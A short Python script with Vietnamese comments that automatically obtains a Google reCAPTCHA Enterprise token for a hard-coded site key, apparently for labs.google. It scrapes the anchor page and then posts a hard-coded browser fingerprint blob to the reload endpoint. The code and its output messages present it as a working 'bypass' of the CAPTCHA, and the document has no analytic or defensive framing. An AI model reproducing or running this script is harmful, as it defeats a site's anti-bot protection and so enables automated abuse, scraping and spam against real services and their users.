
import requests
import json
import urllib
import time

def get_token():
    """
    Lấy recaptcha token bằng cách bypass reload endpoint

    Returns:
        str: Token bypass được nếu thành công, 'null' nếu thất bại
    """
    # Set cứng các giá trị thay vì input từ người dùng
    anchorr = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV&co=aHR0cHM6Ly9sYWJzLmdvb2dsZTo0NDM.&hl=en&v=7gg7H51Q-naNfhmCP3_R47ho&size=invisible&anchor-ms=20000&execute-ms=30000&cb=jx6vinm8gina"
    keysite = anchorr.split('k=')[1].split("&")[0]
    var_co = anchorr.split("co=")[1].split("&")[0]
    var_v = anchorr.split("v=")[1].split("&")[0]

    # Lấy anchor page để lấy token1
    r1 = requests.get(anchorr).text
    token1 = r1.split('recaptcha-token" value="')[1].split('">')[0]

    # Set cứng CHR, VH, BG
    var_chr = "[3,1,1]"  # Giá trị mặc định
    var_vh = "20647982762"
    var_bg = "5uCg4OUKAAQeF4LYbQEHewBxwd8PQmcDf02lHk5JmooIGEgbN1-o6j0f7h6bwkWnLUgBmR65S-1i23LyN6tA-AK_MVTeDH6w1mgRTvqrhUOJvM17CV2zTaBz1mNtPHtWxaWiOk_cZxchLLe95i8kwRS3lF7t06Qu_WHgsG4XCm0WdnYPAOy1_tkbgJeS1BPJp3pQYkjiDU84VDfeliSNzn0Yyo-gLEjlXs7J-jgm_MFtDgeo8ftpGsuIWKcJRQSUak0uixCyTQzgdaUsc02oA5DHTttWMgPucWjvDmUgofvdhG-SR6890xFYkQwLeOiE79VAB65B5cWCBMguGH8eqCpXZjrFCQZzo7FsGSR_NGDoKVBQ82xxrTuviYU8MHdBrAmQYIYt8VP1Zy0PP5XFB4IxaCjZE4LJAj-jFU9KEI22tzbNXIoIK6AFSNCHMhe7OHkbvYIQ02yj4o9sNSEdUG5Pl1sQUbDUNyzPHjhJpPdk35wBQkqkZnP6vXQVSDSERUL54q2JO9IQJQMXpm7AQbL7BMRKXVBhqAK6hVB0Kb6TpynZlNkBg9E0apK_pXQxsAT1NsdwkkGuPVOhXxKFReUHPTiC76OjBGH0Sb49zjJj_6sBG9F-EksiK9LRgCDIZGngCIbwfh7xNzDsn_dnzNS9z-227d5bO3b5TmNMndtk38WxF5zSzjoguqdWLc97qPJsyiw-uAMwNkPT0M7KWhN_4JaY-JlkECBHH89v3UYTivxLvXwH4wEm2KNVp_RV-1cohQZa5kb4xhPUH5Okzm147OSeCagCxzSs6DybfZl8Rrjzsv-X1hzje0Z5TXBSbG0eLkHmmtIKHJc3xKt3M9iEihDNe0FE5mkjOt5YpO9CuXupWb2sbqoL0ilCeTNFVJtZckpvLU7aXSogt7R7UvXy6HW0TGU"
    var_chr = str(urllib.parse.quote(var_chr))

    # Tạo payload cho reload request
    payload = {
        "v":var_v,
        "reason":"q",
        "c":token1,
        "k":keysite,
        "co":var_co,
        "hl":"en",
        "size":"invisible",
        "chr":var_chr,
        "vh":var_vh,
        "bg":var_bg
    }

    # Gửi reload request
    r2 = requests.post("https://www.google.com/recaptcha/api2/reload?k={}".format(keysite), data=payload)

    # Trích xuất token2 từ response
    try:
        token2 = str(r2.text.split('"rresp","')[1].split('"')[0])
    except:
        token2 = 'null'

    return token2

if __name__ == "__main__":
    print("🔄 Bypassing Recaptcha...")
    token = get_token()

    if token == "null":
        print("❌ Recaptcha bypass thất bại!")
        print("💡 Có thể do CHR không hợp lệ hoặc site không vulnerable")
    else:
        print("✅ Recaptcha bypassed thành công!")
        print(f"📝 Token: {token}")
        print(f"📏 Độ dài: {len(token)} ký tự")